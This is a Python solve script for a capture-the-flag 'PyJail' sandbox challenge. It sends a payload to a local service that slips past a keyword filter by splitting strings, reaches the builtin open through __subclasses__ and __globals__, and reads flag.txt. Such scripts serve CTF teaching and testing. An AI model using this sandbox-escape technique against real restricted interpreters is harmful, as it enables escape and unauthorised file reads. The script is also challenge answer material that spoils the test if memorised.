#!/usr/bin/env python3
"""
Intended Solve Script for PyJail AST Sandbox (misc/pyjail)
"""

import sys
import socket

def solve_pyjail(host: str = "127.0.0.1", port: int = 31339) -> str:
    # Construct strings without forbidden substrings: "import", "open", "os", "sys", "flag", etc.
    payload = (
        "subclasses = getattr(getattr(type(()), '__ba'+'se__'), '__sub'+'classes__')(); "
        "g = [getattr(getattr(c, '__in'+'it__', None), '__glob'+'als__', {}) for c in subclasses if '__glob'+'als__' in dir(getattr(c, '__in'+'it__', None))][0]; "
        "b = g.get('__builtins__'); "
        "op = b.get('o'+'p'+'e'+'n') if type(b) == dict else getattr(b, 'o'+'p'+'e'+'n'); "
        "print(op('f'+'lag.txt').read())"
    )

    with socket.create_connection((host, port), timeout=5) as s:
        r = s.makefile("r", encoding="utf-8", newline="\n")
        w = s.makefile("w", encoding="utf-8", newline="\n")
        
        # Read welcome banner & prompt
        r.readline() # === Welcome banner ===
        r.readline() # Enter code prompt
        
        w.write(payload + "\n")
        w.flush()
        
        resp = r.readline().strip()
        return resp

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 31339
    print(solve_pyjail(host, port))
